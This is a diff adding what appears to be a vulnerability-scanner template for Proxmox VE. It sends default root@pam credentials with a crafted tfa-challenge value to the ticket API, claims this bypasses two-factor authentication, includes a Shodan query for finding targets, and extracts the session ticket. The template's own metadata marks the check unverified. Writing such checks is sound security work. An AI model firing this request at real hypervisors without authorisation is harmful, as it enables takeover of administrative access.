@@ -1,0 +1,49 @@
+id: proxmox-ve-default-login
+
+info:
+  name: Proxmox VE - Default Credentials with TFA Bypass
+  author: dhiyaneshDk,0x_Akoko
+  severity: critical
+  description: |
+    Detected Proxmox VE was accessible using default root@pam credentials combined with a TFA challenge bypass. An attacker could authenticate as root by submitting the default password "root@pam" along with a crafted tfa-challenge parameter, thereby bypassing two-factor authentication enforcement and gaining full administrative access to the hypervisor management interface.
+  metadata:
+    verified: false
+    max-request: 1
+    shodan-query: title:"Proxmox"
+  tags: proxmox,default-login,auth-bypass,vuln
+
+http:
+  - raw:
+      - |
+        POST /api2/json/access/ticket HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+        Accept: application/json
+
+        username=root%40pam&password=root%40pam&tfa-challenge=NEBUSEC-CHALLENGE
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"data"'
+          - '"ticket"'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - application/json
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: ticket
+        part: body
+        regex:
+          - '"ticket"\s*:\s*"([^"]+)"'
+        group: 1
